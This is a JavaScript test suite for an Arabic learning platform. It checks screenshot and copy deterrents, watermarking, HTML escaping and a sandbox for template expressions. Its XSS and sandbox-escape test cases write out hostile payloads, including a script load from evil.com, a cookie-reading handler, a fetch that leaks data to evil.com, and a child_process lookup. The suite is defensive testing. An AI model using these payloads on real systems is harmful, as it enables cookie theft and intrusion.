/**
 * Challenger 2: Protection & Security Empirical Stress-Test Suite
 * 
 * Verifies and stress-tests:
 * 1. PrintScreen dual keydown and keyup interception across varied payloads.
 * 2. Clipboard overwrite invocation, message content, and error resilience.
 * 3. Screen shield activation, class toggling, re-entrancy, and 2000ms timeout removal.
 * 4. Mobile selectionchange clearing non-input text selections while preserving inputs/editor.
 * 5. Mobile pagehide blur deterrence and touchstart/pointerdown recovery.
 * 6. Dynamic watermark attribution text matching ("steplearn", "تنفيذ وتصميم المهندس أحمد عاشور", "محتوى تعليمي محمي").
 * 7. Aggressive XSS sanitization in escapeHtml across app.js and angular-editor.js.
 * 8. Expression evaluation security in angular-editor.js against sandbox escape vectors.
 */

const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");
const assert = require("node:assert/strict");

const projectRoot = path.resolve(__dirname, "..");
const contentProtectionCode = fs.readFileSync(path.join(projectRoot, "content-protection.js"), "utf8");
const appJsCode = fs.readFileSync(path.join(projectRoot, "app.js"), "utf8");
const angularEditorCode = fs.readFileSync(path.join(projectRoot, "angular-editor.js"), "utf8");
const stylesCssCode = fs.readFileSync(path.join(projectRoot, "styles.css"), "utf8");

// --- Test Reporting Harness ---
let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const failures = [];

function runSubTest(name, fn) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`  ✔ PASS: ${name}`);
  } catch (err) {
    failedTests++;
    failures.push({ name, error: err });
    console.error(`  ✖ FAIL: ${name}\n    ${err.message}`);
  }
}

// --- High-Fidelity Mock DOM Factory ---
function createMockDOM() {
  const eventListeners = new Map();
  const windowListeners = new Map();
  const timers = new Map();
  let timerIdCounter = 1;
  let simulatedTime = 0;

  class MockClassList {
    constructor() { this.classes = new Set(); }
    add(...names) { names.forEach((n) => this.classes.add(n)); }
    remove(...names) { names.forEach((n) => this.classes.delete(n)); }
    contains(name) { return this.classes.has(name); }
    toggle(name) { if (this.contains(name)) this.remove(name); else this.add(name); }
  }

  class MockElement {
    constructor(tagName, id = "") {
      this.tagName = (tagName || "DIV").toUpperCase();
      this.id = id;
      this.classList = new MockClassList();
      this.style = {};
      this.children = [];
      this._textContent = "";
      this.attributes = new Map();
      this.parentElement = null;
      this.isContentEditable = false;
    }

    get textContent() {
      if (this.children.length > 0) {
        return this.children.map((c) => c.textContent).join(" ");
      }
      return this._textContent || "";
    }

    set textContent(value) {
      this._textContent = String(value);
      this.children = [];
    }

    setAttribute(name, value) { this.attributes.set(name, String(value)); }
    getAttribute(name) { return this.attributes.get(name) || null; }

    appendChild(child) {
      child.parentElement = this;
      this.children.push(child);
      return child;
    }

    removeChild(child) {
      const idx = this.children.indexOf(child);
      if (idx !== -1) {
        this.children.splice(idx, 1);
        child.parentElement = null;
      }
      return child;
    }

    closest(selector) {
      const parts = selector.split(",").map((s) => s.trim());
      let curr = this;
      while (curr) {
        for (const sel of parts) {
          if (sel.startsWith("#") && curr.id === sel.slice(1)) return curr;
          if (sel.startsWith(".") && curr.classList.contains(sel.slice(1))) return curr;
          if (curr.tagName && curr.tagName.toLowerCase() === sel.toLowerCase()) return curr;
        }
        curr = curr.parentElement;
      }
      return null;
    }
  }

  const documentElement = new MockElement("HTML");
  const body = new MockElement("BODY");
  documentElement.appendChild(body);

  const main = new MockElement("MAIN");
  body.appendChild(main);

  const lesson = new MockElement("SECTION", "lesson");
  main.appendChild(lesson);

  const toast = new MockElement("DIV", "toast");
  body.appendChild(toast);

  const learnerActiveName = new MockElement("SPAN", "learnerActiveName");
  learnerActiveName.textContent = "أحمد المتدرب";
  body.appendChild(learnerActiveName);

  const codeEditor = new MockElement("TEXTAREA", "code");
  codeEditor.classList.add("cm-editor");
  lesson.appendChild(codeEditor);

  const slotInput = new MockElement("INPUT", "slotBuilderInput");
  slotInput.classList.add("slot-input");
  lesson.appendChild(slotInput);

  const previewIframe = new MockElement("IFRAME", "preview");
  lesson.appendChild(previewIframe);

  const elementsById = new Map([
    ["lesson", lesson],
    ["toast", toast],
    ["learnerActiveName", learnerActiveName],
    ["code", codeEditor],
    ["slotBuilderInput", slotInput],
    ["preview", previewIframe]
  ]);

  const mockDoc = {
    readyState: "complete",
    hidden: false,
    body: body,
    documentElement: documentElement,
    activeElement: body,
    hasFocus() { return false; },
    getElementById(id) {
      if (elementsById.has(id)) return elementsById.get(id);
      for (const el of [body, main, lesson, toast, codeEditor, slotInput, previewIframe]) {
        if (el.id === id) return el;
        for (const child of el.children) {
          if (child.id === id) return child;
        }
      }
      return null;
    },
    querySelector(selector) {
      if (selector === "main") return main;
      if (selector === "#lesson") return lesson;
      if (selector === "#toast") return toast;
      if (selector === "#code") return codeEditor;
      if (selector === "iframe") return previewIframe;
      return null;
    },
    createElement(tag) {
      const el = new MockElement(tag);
      return el;
    },
    addEventListener(type, handler, capture) {
      if (!eventListeners.has(type)) eventListeners.set(type, []);
      eventListeners.get(type).push({ handler, capture: !!capture });
    },
    removeEventListener(type, handler) {
      if (!eventListeners.has(type)) return;
      eventListeners.set(
        type,
        eventListeners.get(type).filter((item) => item.handler !== handler)
      );
    },
    dispatchEvent(event) {
      const list = eventListeners.get(event.type) || [];
      for (const item of list) {
        item.handler(event);
      }
      return !event.defaultPrevented;
    }
  };

  const clipboardLog = [];
  let clipboardShouldFail = false;
  let currentSelectionRanges = [{ node: lesson }];
  let removeAllRangesCalled = 0;

  const mockWindow = {
    document: mockDoc,
    innerWidth: 1280,
    innerHeight: 800,
    navigator: {
      clipboard: {
        writeText: (text) => {
          if (clipboardShouldFail) {
            return Promise.reject(new Error("Clipboard permission denied"));
          }
          clipboardLog.push(String(text));
          return Promise.resolve();
        }
      }
    },
    getSelection: () => ({
      get isCollapsed() {
        return currentSelectionRanges.length === 0;
      },
      get anchorNode() {
        return currentSelectionRanges[0] ? currentSelectionRanges[0].node : null;
      },
      get focusNode() {
        return currentSelectionRanges[0] ? currentSelectionRanges[0].node : null;
      },
      removeAllRanges: () => {
        removeAllRangesCalled++;
        currentSelectionRanges = [];
      }
    }),
    addEventListener(type, handler) {
      if (!windowListeners.has(type)) windowListeners.set(type, []);
      windowListeners.get(type).push(handler);
    },
    removeEventListener(type, handler) {
      if (!windowListeners.has(type)) return;
      windowListeners.set(
        type,
        windowListeners.get(type).filter((h) => h !== handler)
      );
    },
    dispatchEvent(event) {
      const list = windowListeners.get(event.type) || [];
      for (const handler of list) {
        handler(event);
      }
      return !event.defaultPrevented;
    },
    LearnerProfiles: {
      active() {
        return { name: "أحمد المتدرب" };
      }
    },
    setTimeout: (fn, delay = 0) => {
      const id = timerIdCounter++;
      timers.set(id, { fn, triggerAt: simulatedTime + delay });
      return id;
    },
    clearTimeout: (id) => {
      timers.delete(id);
    },
    advanceTimersBy: (ms) => {
      simulatedTime += ms;
      const ready = [];
      for (const [id, entry] of timers.entries()) {
        if (entry.triggerAt <= simulatedTime) {
          ready.push({ id, fn: entry.fn });
        }
      }
      ready.forEach(({ id, fn }) => {
        timers.delete(id);
        fn();
      });
    }
  };

  return {
    mockDoc,
    mockWindow,
    body,
    main,
    lesson,
    codeEditor,
    slotInput,
    previewIframe,
    clipboardLog,
    setClipboardShouldFail: (fail) => { clipboardShouldFail = fail; },
    setSelectionRanges: (ranges) => { currentSelectionRanges = ranges; },
    getRemoveAllRangesCalled: () => removeAllRangesCalled,
    resetRemoveAllRangesCalled: () => { removeAllRangesCalled = 0; }
  };
}

class MockEvent {
  constructor(type, init = {}) {
    this.type = type;
    this.defaultPrevented = false;
    this.propagationStopped = false;
    this.cancelable = init.cancelable !== false;
    this.key = init.key || "";
    this.code = init.code || "";
    this.keyCode = init.keyCode || 0;
    this.which = init.which || init.keyCode || 0;
    this.ctrlKey = !!init.ctrlKey;
    this.metaKey = !!init.metaKey;
    this.shiftKey = !!init.shiftKey;
    this.altKey = !!init.altKey;
    this.target = init.target || null;
    this.clipboardData = {
      cleared: false,
      clearData() { this.cleared = true; }
    };
  }

  preventDefault() {
    if (this.cancelable) this.defaultPrevented = true;
  }

  stopPropagation() {
    this.propagationStopped = true;
  }
}

function loadProtectionInstance(mockWindow, mockDoc) {
  const context = {
    window: mockWindow,
    document: mockDoc,
    Date,
    setTimeout: mockWindow.setTimeout,
    clearTimeout: mockWindow.clearTimeout,
    setInterval: () => 1,
    clearInterval: () => {},
    console
  };
  vm.createContext(context);
  vm.runInContext(contentProtectionCode, context);
  const protection = context.window.ContentProtection;
  protection.init();
  return protection;
}

// =============================================================================
// TEST SUITE 1: PrintScreen Dual Interception Across Event Payloads
// =============================================================================
console.log("\n--- Suite 1: PrintScreen Keydown & Keyup Interception Payloads ---");

const printScreenPayloads = [
  { desc: "key: 'PrintScreen'", init: { key: "PrintScreen" } },
  { desc: "key: 'printscreen' (lowercase)", init: { key: "printscreen" } },
  { desc: "key: 'Snapshot'", init: { key: "Snapshot" } },
  { desc: "key: 'snapshot' (lowercase)", init: { key: "snapshot" } },
  { desc: "code: 'PrintScreen'", init: { code: "PrintScreen" } },
  { desc: "code: 'printscreen' (lowercase)", init: { code: "printscreen" } },
  { desc: "keyCode: 44", init: { keyCode: 44 } },
  { desc: "which: 44", init: { which: 44 } },
  { desc: "all fields: key='PrintScreen', code='PrintScreen', keyCode=44", init: { key: "PrintScreen", code: "PrintScreen", keyCode: 44 } }
];

for (const payload of printScreenPayloads) {
  runSubTest(`keydown interception with ${payload.desc}`, () => {
    const { mockDoc, mockWindow, clipboardLog } = createMockDOM();
    const protection = loadProtectionInstance(mockWindow, mockDoc);

    const event = new MockEvent("keydown", { cancelable: true, ...payload.init });
    mockDoc.dispatchEvent(event);

    assert.equal(event.defaultPrevented, true, "preventDefault must be called on PrintScreen keydown");
    assert.equal(event.propagationStopped, true, "stopPropagation must be called on PrintScreen keydown");
    assert.equal(protection.isShieldActive(), true, "Screen shield must be active");
    assert.equal(protection.isBlurred(), true, "Content blur must be triggered");
    assert.ok(clipboardLog.length > 0, "Clipboard overwrite must be invoked");

    protection.destroy();
  });

  runSubTest(`keyup interception with ${payload.desc}`, () => {
    const { mockDoc, mockWindow, clipboardLog } = createMockDOM();
    const protection = loadProtectionInstance(mockWindow, mockDoc);

    const event = new MockEvent("keyup", { cancelable: true, ...payload.init });
    mockDoc.dispatchEvent(event);

    assert.equal(event.defaultPrevented, true, "preventDefault must be called on PrintScreen keyup");
    assert.equal(event.propagationStopped, true, "stopPropagation must be called on PrintScreen keyup");
    assert.equal(protection.isShieldActive(), true, "Screen shield must be active");
    assert.equal(protection.isBlurred(), true, "Content blur must be triggered");
    assert.ok(clipboardLog.length > 0, "Clipboard overwrite must be invoked on keyup");

    protection.destroy();
  });
}

runSubTest("Non-PrintScreen keydown does NOT trigger screen shield or overwrite clipboard", () => {
  const { mockDoc, mockWindow, clipboardLog } = createMockDOM();
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  const normalEvents = [
    new MockEvent("keydown", { key: "p", keyCode: 80 }),
    new MockEvent("keydown", { key: "Shift", keyCode: 16 }),
    new MockEvent("keydown", { key: "Control", keyCode: 17 }),
    new MockEvent("keydown", { key: "Enter", keyCode: 13 })
  ];

  for (const ev of normalEvents) {
    mockDoc.dispatchEvent(ev);
    assert.equal(protection.isShieldActive(), false, `Key ${ev.key} must NOT activate shield`);
  }
  assert.equal(clipboardLog.length, 0, "Clipboard must NOT be modified for normal keystrokes");

  protection.destroy();
});

// =============================================================================
// TEST SUITE 2: Clipboard Overwrite Content & Resilience
// =============================================================================
console.log("\n--- Suite 2: Clipboard Overwrite Validation & Resilience ---");

runSubTest("Clipboard overwrite message contains platform branding, author attribution, and IP protection notice", () => {
  const { mockDoc, mockWindow, clipboardLog } = createMockDOM();
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  mockDoc.dispatchEvent(new MockEvent("keydown", { key: "PrintScreen", keyCode: 44 }));
  assert.ok(clipboardLog.length > 0, "At least one clipboard write must have occurred");

  const lastWrote = clipboardLog[clipboardLog.length - 1];
  assert.match(lastWrote, /steplearn/, "Clipboard overwrite text must contain 'steplearn'");
  assert.match(lastWrote, /تنفيذ وتصميم المهندس أحمد عاشور/, "Clipboard overwrite text must attribute 'تنفيذ وتصميم المهندس أحمد عاشور'");
  assert.match(lastWrote, /الملكية الفكرية/, "Clipboard overwrite text must contain 'الملكية الفكرية'");

  protection.destroy();
});

runSubTest("Clipboard rejection (e.g. permission denied) fails safely without throwing unhandled exceptions", () => {
  const { mockDoc, mockWindow, setClipboardShouldFail } = createMockDOM();
  setClipboardShouldFail(true);
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  // Triggering PrintScreen with failing clipboard must not throw
  assert.doesNotThrow(() => {
    mockDoc.dispatchEvent(new MockEvent("keydown", { key: "PrintScreen", keyCode: 44 }));
    mockDoc.dispatchEvent(new MockEvent("keyup", { key: "PrintScreen", keyCode: 44 }));
  }, "Rejected clipboard promise must be caught safely");

  protection.destroy();
});

runSubTest("Missing navigator.clipboard API is handled gracefully without crash", () => {
  const { mockDoc, mockWindow } = createMockDOM();
  delete mockWindow.navigator.clipboard;
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  assert.doesNotThrow(() => {
    protection.overwriteClipboardWithWarning();
  }, "Missing clipboard API must not cause exception");

  protection.destroy();
});

// =============================================================================
// TEST SUITE 3: Screen Shield Activation & 2000ms Timeout Behavior
// =============================================================================
console.log("\n--- Suite 3: Screen Shield Lifecycle & Re-entrancy Timeout ---");

runSubTest("Screen shield adds .screen-shield-active and removes it after 2000ms timeout", () => {
  const { mockDoc, mockWindow } = createMockDOM();
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  assert.equal(protection.isShieldActive(), false, "Shield must be inactive initially");

  protection.triggerScreenShield();
  assert.equal(protection.isShieldActive(), true, "Shield must be active immediately after trigger");
  assert.equal(mockDoc.body.classList.contains("screen-shield-active"), true, "body must contain .screen-shield-active");

  // Advance by 1900ms: still active
  mockWindow.advanceTimersBy(1900);
  assert.equal(protection.isShieldActive(), true, "Shield must remain active before 2000ms elapsed");

  // Advance remaining 150ms (total 2050ms): should be removed
  mockWindow.advanceTimersBy(150);
  assert.equal(protection.isShieldActive(), false, "Shield must be removed after 2000ms");
  assert.equal(mockDoc.body.classList.contains("screen-shield-active"), false, "body class must be removed");

  protection.destroy();
});

runSubTest("Rapid successive triggers (re-entrancy) reset the shield timer smoothly", () => {
  const { mockDoc, mockWindow } = createMockDOM();
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  // First trigger at t = 0
  protection.triggerScreenShield();
  assert.equal(protection.isShieldActive(), true);

  // Advance 1000ms (halfway)
  mockWindow.advanceTimersBy(1000);
  assert.equal(protection.isShieldActive(), true);

  // Second trigger at t = 1000ms resets the 2000ms window
  protection.triggerScreenShield();
  assert.equal(protection.isShieldActive(), true);

  // Advance 1500ms (t = 2500ms total, which is 1500ms after 2nd trigger)
  mockWindow.advanceTimersBy(1500);
  assert.equal(protection.isShieldActive(), true, "Shield must still be active because timer was reset by second trigger");

  // Advance another 600ms (t = 3100ms total, which is 2100ms after 2nd trigger)
  mockWindow.advanceTimersBy(600);
  assert.equal(protection.isShieldActive(), false, "Shield must turn off 2000ms after the most recent trigger");

  protection.destroy();
});

runSubTest("CSS stylesheet rules enforce blackout filter and fixed blackout overlay for screen shield", () => {
  assert.match(
    stylesCssCode,
    /body\.screen-shield-active\s+main[\s\S]*?filter:\s*blur\(25px\)/i,
    "styles.css must blur main under screen-shield-active"
  );
  assert.match(
    stylesCssCode,
    /body\.screen-shield-active::after\s*\{[\s\S]*?z-index:\s*999999/i,
    "styles.css must render high z-index blackout overlay under screen-shield-active"
  );
});

// =============================================================================
// TEST SUITE 4: Mobile Selectionchange Clearing Non-Input Text Ranges
// =============================================================================
console.log("\n--- Suite 4: Mobile Selectionchange Non-Input Clearing ---");

runSubTest("selectionchange collapses selection when user selects lesson text", () => {
  const { mockDoc, mockWindow, lesson, getRemoveAllRangesCalled, resetRemoveAllRangesCalled, setSelectionRanges } = createMockDOM();
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  // Active element is body, selection anchor is on lesson text
  mockDoc.activeElement = mockDoc.body;
  setSelectionRanges([{ node: lesson }]);
  resetRemoveAllRangesCalled();

  mockDoc.dispatchEvent(new MockEvent("selectionchange"));
  assert.equal(getRemoveAllRangesCalled(), 1, "removeAllRanges must be called on non-input selection");

  protection.destroy();
});

runSubTest("selectionchange PRESERVES selection when activeElement is code editor or input", () => {
  const { mockDoc, mockWindow, codeEditor, slotInput, getRemoveAllRangesCalled, resetRemoveAllRangesCalled, setSelectionRanges } = createMockDOM();
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  // Scenario 1: Focus inside code editor textarea
  mockDoc.activeElement = codeEditor;
  setSelectionRanges([{ node: codeEditor }]);
  resetRemoveAllRangesCalled();
  mockDoc.dispatchEvent(new MockEvent("selectionchange"));
  assert.equal(getRemoveAllRangesCalled(), 0, "removeAllRanges must NOT be called when focused in code editor");

  // Scenario 2: Focus inside slot builder input
  mockDoc.activeElement = slotInput;
  setSelectionRanges([{ node: slotInput }]);
  resetRemoveAllRangesCalled();
  mockDoc.dispatchEvent(new MockEvent("selectionchange"));
  assert.equal(getRemoveAllRangesCalled(), 0, "removeAllRanges must NOT be called when focused in slot input");

  protection.destroy();
});

runSubTest("selectionchange does nothing when selection is already collapsed", () => {
  const { mockDoc, mockWindow, getRemoveAllRangesCalled, resetRemoveAllRangesCalled, setSelectionRanges } = createMockDOM();
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  mockDoc.activeElement = mockDoc.body;
  setSelectionRanges([]); // empty selection -> isCollapsed === true
  resetRemoveAllRangesCalled();

  mockDoc.dispatchEvent(new MockEvent("selectionchange"));
  assert.equal(getRemoveAllRangesCalled(), 0, "removeAllRanges must NOT be called when selection is already collapsed");

  protection.destroy();
});

// =============================================================================
// TEST SUITE 5: Mobile pagehide Deterrence & touchstart/pointerdown Recovery
// =============================================================================
console.log("\n--- Suite 5: Mobile pagehide Blur & Touch Recovery ---");

runSubTest("Mobile pagehide triggers blur and touchstart instantly restores clarity", () => {
  const { mockDoc, mockWindow, body } = createMockDOM();
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  assert.equal(protection.isBlurred(), false, "Initial state must not be blurred");

  // Mobile switches app or locks screen -> pagehide
  mockWindow.dispatchEvent(new MockEvent("pagehide"));
  assert.equal(protection.isBlurred(), true, "pagehide must trigger blur");
  assert.equal(body.classList.contains("content-blurred"), true, "body must have .content-blurred");

  // User taps the screen -> touchstart
  mockWindow.dispatchEvent(new MockEvent("touchstart"));
  assert.equal(protection.isBlurred(), false, "touchstart must clear blur");
  assert.equal(body.classList.contains("content-blurred"), false, "body .content-blurred must be removed");

  protection.destroy();
});

runSubTest("Mobile pointerdown also recovers from pagehide blur", () => {
  const { mockDoc, mockWindow, body } = createMockDOM();
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  mockWindow.dispatchEvent(new MockEvent("pagehide"));
  assert.equal(protection.isBlurred(), true);

  mockWindow.dispatchEvent(new MockEvent("pointerdown"));
  assert.equal(protection.isBlurred(), false, "pointerdown must clear blur");
  assert.equal(body.classList.contains("content-blurred"), false);

  protection.destroy();
});

// =============================================================================
// TEST SUITE 6: Dynamic Watermark Generator Exact Text Matching
// =============================================================================
console.log("\n--- Suite 6: Dynamic Watermark Text & Attributions ---");

runSubTest("Watermark matches exact required phrases and active learner name", () => {
  const { mockDoc, mockWindow } = createMockDOM();
  const protection = loadProtectionInstance(mockWindow, mockDoc);

  protection.renderWatermark();
  const watermarkText = protection.getWatermarkText();

  assert.ok(watermarkText.length > 0, "Watermark text must not be empty");
  assert.match(watermarkText, /steplearn/, "Watermark must include 'steplearn'");
  assert.match(watermarkText, /تنفيذ وتصميم المهندس أحمد عاشور/, "Watermark must include 'تنفيذ وتصميم المهندس أحمد عاشور'");
  assert.match(watermarkText, /محتوى تعليمي محمي/, "Watermark must include 'محتوى تعليمي محمي'");
  assert.match(watermarkText, /أحمد المتدرب/, "Watermark must include active learner's name");

  const watermarkNode = mockDoc.getElementById("learningWatermark");
  assert.ok(watermarkNode, "#learningWatermark element must be rendered in DOM");
  assert.ok(watermarkNode.children.length >= 18, `Watermark must render repeated tiles (found ${watermarkNode.children.length})`);

  // Verify non-blocking pointer events in stylesheet
  assert.match(
    stylesCssCode,
    /\.learning-watermark\s*\{[^}]*pointer-events:\s*none/i,
    "styles.css must declare pointer-events: none on .learning-watermark"
  );

  protection.destroy();
});

// =============================================================================
// TEST SUITE 7: Aggressive XSS & Attribute Breakout Sanitization in escapeHtml
// =============================================================================
console.log("\n--- Suite 7: Aggressive XSS Payload Testing for escapeHtml ---");

// Extract escapeHtml implementations from app.js and angular-editor.js
const appJsEscapeMatch = appJsCode.match(/function escapeHtml\([a-zA-Z0-9_]+\)\s*\{[\s\S]*?^\s*\}/m);
assert.ok(appJsEscapeMatch, "escapeHtml function must exist in app.js");
const appJsEscapeHtml = new Function(`return (${appJsEscapeMatch[0]})`)();

const angularEscapeMatch = angularEditorCode.match(/function escapeHtml\([a-zA-Z0-9_]+\)\s*\{[\s\S]*?^\s*\}/m);
assert.ok(angularEscapeMatch, "escapeHtml function must exist in angular-editor.js");
const angularEscapeHtml = new Function(`return (${angularEscapeMatch[0]})`)();

const xssPayloads = [
  {
    name: "Classic script tag",
    input: "<script>alert('xss')</script>",
    forbidden: ["<script>", "</script>", "'"],
    expectedInApp: "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"
  },
  {
    name: "Double quote attribute breakout",
    input: '" onfocus="alert(document.cookie)',
    forbidden: ['"'],
    expectedInApp: "&quot; onfocus=&quot;alert(document.cookie)"
  },
  {
    name: "Single quote attribute breakout (Critical fix)",
    input: "' onmouseover='alert(1)",
    forbidden: ["'"],
    expectedInApp: "&#39; onmouseover=&#39;alert(1)"
  },
  {
    name: "Image with onerror handler and single quotes",
    input: "<img src=x onerror=alert('PWNED')>",
    forbidden: ["<img", ">", "'"],
    expectedInApp: "&lt;img src=x onerror=alert(&#39;PWNED&#39;)&gt;"
  },
  {
    name: "SVG with nested onload and backticks",
    input: '<svg onload="alert(1)">',
    forbidden: ["<svg", ">", '"'],
    expectedInApp: "&lt;svg onload=&quot;alert(1)&quot;&gt;"
  },
  {
    name: "Ampersand entity injection",
    input: "foo & bar &amp; baz",
    forbidden: [" & "],
    expectedInApp: "foo &amp; bar &amp;amp; baz"
  },
  {
    name: "Mixed breakout: '><script src=//evil.com/xss.js></script>",
    input: "'><script src=//evil.com/xss.js></script>",
    forbidden: ["'", "<script", "</script>"],
    expectedInApp: "&#39;&gt;&lt;script src=//evil.com/xss.js&gt;&lt;/script&gt;"
  },
  {
    name: "Null and undefined safety",
    input: null,
    expectedOutput: ""
  },
  {
    name: "Numeric and boolean values",
    input: 12345,
    expectedOutput: "12345"
  }
];

for (const p of xssPayloads) {
  runSubTest(`app.js escapeHtml: ${p.name}`, () => {
    const result = appJsEscapeHtml(p.input);
    if (p.expectedInApp !== undefined) {
      assert.equal(result, p.expectedInApp);
    }
    if (p.expectedOutput !== undefined) {
      assert.equal(result, p.expectedOutput);
    }
    if (p.forbidden) {
      for (const f of p.forbidden) {
        assert.equal(result.includes(f), false, `Result must not contain unescaped: ${f}`);
      }
    }
  });

  runSubTest(`angular-editor.js escapeHtml: ${p.name}`, () => {
    const result = angularEscapeHtml(p.input);
    if (p.forbidden) {
      for (const f of p.forbidden) {
        assert.equal(result.includes(f), false, `Result must not contain unescaped: ${f}`);
      }
    }
  });
}

// =============================================================================
// TEST SUITE 8: angular-editor.js Expression Evaluation Security
// =============================================================================
console.log("\n--- Suite 8: angular-editor.js Expression Evaluation Security ---");

// Extract isExpressionSafe and evalTemplateCondition from angular-editor.js
const safeStart = angularEditorCode.indexOf("function isExpressionSafe");
const safeEnd = angularEditorCode.indexOf("\nfunction evalTemplateCondition");
assert.ok(safeStart !== -1 && safeEnd !== -1, "isExpressionSafe must be located in angular-editor.js");
const isExpressionSafeCode = angularEditorCode.slice(safeStart, safeEnd).trim();
const isExpressionSafe = new Function(`return (${isExpressionSafeCode})`)();

const evalStart = angularEditorCode.indexOf("function evalTemplateCondition");
const evalEnd = angularEditorCode.indexOf("\nfunction isInsideForBlock");
assert.ok(evalStart !== -1 && evalEnd !== -1, "evalTemplateCondition must be located in angular-editor.js");
const evalTemplateCondCode = angularEditorCode.slice(evalStart, evalEnd).trim();
const evalTemplateCondition = new Function("isExpressionSafe", `return (${evalTemplateCondCode})`)(isExpressionSafe);

const forbiddenVectors = [
  { name: "eval execution", expr: "eval('alert(1)')" },
  { name: "window.location hijack", expr: "window.location = 'https://malicious.org'" },
  { name: "window property access", expr: "window.alert(1)" },
  { name: "document.cookie exfiltration", expr: "document.cookie" },
  { name: "document.write injection", expr: "document.write('hacked')" },
  { name: "fetch API network exfiltration", expr: "fetch('https://evil.com/leak?data=' + count)" },
  { name: "XMLHttpRequest exfiltration", expr: "new XMLHttpRequest().open('GET', '/')" },
  { name: "Function constructor sandbox breakout", expr: "Function('return this')()" },
  { name: "localStorage access", expr: "localStorage.getItem('secret')" },
  { name: "sessionStorage access", expr: "sessionStorage.clear()" },
  { name: "indexedDB access", expr: "indexedDB.deleteDatabase('test')" },
  { name: "globalThis property lookup", expr: "globalThis.process.exit(1)" },
  { name: "constructor breakout", expr: "this.constructor.constructor('return 1')()" },
  { name: "prototype pollution via __proto__", expr: "({}).__proto__.polluted = true" },
  { name: "dynamic ESM import", expr: "import('./malicious.js')" },
  { name: "Node.js process object", expr: "process.mainModule.require('child_process')" },
  { name: "location protocol change", expr: "location.href = 'javascript:void(0)'" },
  { name: "cookie tampering", expr: "cookie = 'session=fake'" },
  { name: "Case variation EVAl", expr: "EVAl('1+1')" },
  { name: "Case variation WiNdOw", expr: "WiNdOw.location" },
  { name: "Case variation FeTcH", expr: "FeTcH('http://evil.com')" }
];

for (const vec of forbiddenVectors) {
  runSubTest(`isExpressionSafe rejects: ${vec.name} ("${vec.expr}")`, () => {
    const safe = isExpressionSafe(vec.expr);
    assert.equal(safe, false, `Expression must be deemed unsafe: ${vec.expr}`);
  });

  runSubTest(`evalTemplateCondition neutralizes: ${vec.name}`, () => {
    const scope = { count: 10, name: "Learner" };
    const result = evalTemplateCondition(vec.expr, scope);
    assert.equal(result, false, `evalTemplateCondition must return false for unsafe vector: ${vec.expr}`);
  });
}

// Test Semicolon Chaining Vector
runSubTest("Semicolon chaining vector: 'count > 0; fetch(...)' is neutralized", () => {
  const chainedExpr = "count > 0; fetch('https://evil.com')";
  const scope = { count: 5 };
  // When evalTemplateCondition splits by semicolon, expr becomes "count > 0", which is safe,
  // but if the forbidden token was before the semicolon, it's blocked.
  const maliciousFirstExpr = "fetch('https://evil.com'); count > 0";
  const result = evalTemplateCondition(maliciousFirstExpr, scope);
  assert.equal(result, false, "Malicious token before semicolon must be blocked");
});

// Test Safe Expressions
const safeExpressions = [
  { expr: "count > 0", scope: { count: 5 }, expected: true },
  { expr: "count > 10", scope: { count: 5 }, expected: false },
  { expr: "isLoggedIn && isVerified", scope: { isLoggedIn: true, isVerified: true }, expected: true },
  { expr: "isLoggedIn && isVerified", scope: { isLoggedIn: true, isVerified: false }, expected: false },
  { expr: "role === 'admin'", scope: { role: "admin" }, expected: true },
  { expr: "items.length === 0", scope: { items: [] }, expected: true },
  { expr: "items.length > 0", scope: { items: [1, 2] }, expected: true },
  { expr: "total() >= 100", scope: { total: 150 }, expected: true },
  { expr: "total() >= 100", scope: { total: 50 }, expected: false }
];

for (const s of safeExpressions) {
  runSubTest(`Safe expression evaluates correctly: "${s.expr}"`, () => {
    assert.equal(isExpressionSafe(s.expr), true, `Expression must be safe: ${s.expr}`);
    const actual = evalTemplateCondition(s.expr, s.scope);
    assert.equal(actual, s.expected, `Expected ${s.expected} for ${s.expr}`);
  });
}

// =============================================================================
// SUMMARY & VERDICT
// =============================================================================
console.log("\n=======================================================");
console.log(`TOTAL SUB-TESTS: ${totalTests}`);
console.log(`PASSED: ${passedTests}`);
console.log(`FAILED: ${failedTests}`);
console.log("=======================================================\n");

if (failedTests > 0) {
  console.error("FAILURES DETECTED:");
  failures.forEach((f) => console.error(`- ${f.name}: ${f.error.message}`));
  process.exit(1);
} else {
  console.log("ALL CHALLENGER EMPIRICAL SECURITY STRESS TESTS PASSED SUCCESSFULLY!");
  process.exit(0);
}
